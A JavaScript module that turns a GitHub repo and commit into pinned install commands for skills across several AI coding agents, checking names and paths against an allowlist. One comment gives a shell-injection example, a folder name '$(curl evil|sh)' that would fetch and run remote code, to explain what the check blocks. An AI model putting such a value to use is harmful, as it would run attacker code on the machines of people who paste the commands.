// Install commands for one skill, built from fixed templates. No AI writes any of this.
// Every folder below comes from the agent's own documentation (checked 2026-11-11):
//   Claude Code  https://code.claude.com/docs/en/skills
//   Codex        https://learn.chatgpt.com/docs/build-skills
//   Cursor       https://cursor.com/docs/context/skills
//   Copilot      https://docs.github.com/en/copilot/concepts/agents/about-agent-skills
//   Gemini CLI   https://geminicli.com/docs/cli/skills/
//   OpenCode     https://opencode.ai/docs/skills/
// `npx skills` is a third-party installer (vercel-labs/skills); `gh skill` is GitHub's own.
// Windsurf's own docs could not be confirmed, so it only gets the third-party installer.
export const AGENT_DOCS = {
  claude: { label: 'Claude Code', dir: '~/.claude/skills', npx: 'claude-code', gh: 'claude-code' },
  codex: { label: 'Codex', dir: '~/.agents/skills', npx: 'codex', gh: 'codex' },
  cursor: { label: 'Cursor', dir: '~/.cursor/skills', npx: 'cursor', gh: 'cursor' },
  copilot: { label: 'GitHub Copilot', dir: '~/.copilot/skills', npx: 'github-copilot', gh: 'github-copilot' },
  gemini: { label: 'Gemini CLI', dir: '~/.gemini/skills', npx: 'gemini-cli', gh: 'gemini-cli' },
  opencode: { label: 'OpenCode', dir: '~/.config/opencode/skills', npx: 'opencode', gh: 'opencode' },
  windsurf: { label: 'Windsurf', dir: null, npx: 'windsurf', gh: null },
};

// Repo names and skill paths come from other people's repos and end up in shell commands that visitors
// copy and run, so only plain characters are allowed: a folder named $(curl evil|sh) must never get a command.
const SAFE = /^[A-Za-z0-9._-]+$/;
const safePath = (p) => p.split('/').every((seg) => SAFE.test(seg) && seg !== '..');

// skill: { name, path } where path is the SKILL.md path in the repo. sha pins the commit.
// Throws when any name or path has characters outside the safe set; the caller then shows no commands.
export function buildInstall({ full_name, sha, skills }) {
  if (!/^[A-Za-z0-9._-]+\/[A-Za-z0-9._-]+$/.test(full_name)) throw new Error(`unsafe repo name ${JSON.stringify(full_name)}`);
  if (!/^[0-9a-f]{40}$/.test(sha)) throw new Error('commit id is not a full sha');
  if (!skills.length || !SAFE.test(skills[0].name) || !safePath(skills[0].path)) throw new Error('skill folder name has characters that are unsafe in a shell command');
  const url = `https://github.com/${full_name}.git`;
  const repo = full_name.split('/')[1];
  const first = skills[0];
  const many = skills.length > 1;
  const folder = first.path.includes('/') ? first.path.slice(0, first.path.lastIndexOf('/')) : '';
  const copy = (dir) => [
    `git clone ${url} skill-src`,
    `git -C skill-src checkout ${sha}`,
    `mkdir -p ${dir}`,
    folder ? `cp -r skill-src/${folder} ${dir}/${first.name}` : `cp -r skill-src ${dir}/${first.name} && rm -rf ${dir}/${first.name}/.git`,
  ].join('\n');

  const out = {};
  for (const [id, a] of Object.entries(AGENT_DOCS)) {
    const methods = [];
    if (a.gh) methods.push({ title: 'GitHub CLI (made by GitHub)', note: many ? `Installs ${first.name}. Use another skill name from the list to install a different one.` : null, code: `gh skill install ${full_name} ${first.name} --agent ${a.gh} --scope user --pin ${sha}` });
    methods.push({ title: 'npx skills (third-party installer, needs Node 22.20 or newer)', note: many ? `Installs all ${skills.length} skills. Use --skill <name> for one.` : null, code: `npx skills add ${full_name} -a ${a.npx} -g${many ? ' --all' : ''}` });
    if (id === 'gemini') methods.unshift({ title: 'Gemini CLI (built in)', note: null, code: `gemini skills install ${url} --scope user${folder ? ` --path ${folder}` : ''}` });
    if (a.dir) methods.push({ title: `Copy it yourself into ${a.dir}`, note: 'Pinned to the exact version we checked. Open a new session afterwards.', code: copy(a.dir) });
    out[id] = { label: a.label, verified: Boolean(a.dir), methods };
  }
  out.claudeai = { label: 'Claude.ai (website)', verified: true, methods: [{ title: 'Upload as a zip', note: 'Zip the skill folder so the folder itself is at the top of the zip, then upload it in Customize > Skills. Code execution must be on. Skills you upload here do not sync to Claude Code.', code: null }] };
  return { repo, sha, skill: first.name, install: out };
}
